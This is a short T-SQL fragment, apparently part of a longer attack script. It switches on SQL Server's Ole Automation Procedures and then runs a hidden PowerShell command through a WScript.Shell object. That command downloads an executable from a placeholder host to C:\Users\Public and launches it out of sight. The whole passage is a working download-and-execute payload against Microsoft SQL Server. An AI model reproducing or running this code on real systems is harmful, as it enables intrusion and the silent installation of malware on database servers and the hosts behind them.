EXEC sp_configure 'Ole Automation Procedures', 1;
    SET @cmd = 'powershell -nop -w hidden -c "$w=new-object net.webclient;$w.Proxy=$null;$w.DownloadFile(''http://payload.example.invalid/down.exe'',''C:\Users\Public\down.exe'');Start-Process -FilePath C:\Users\Public\down.exe -WindowStyle Hidden"';
    
    EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
    
    IF @shell IS NOT NULL
    BEGIN
        EXEC sp_OAMethod @shell, 'Run', NULL, @cmd, 0, 0;
        EXEC sp_OADestroy @shell;
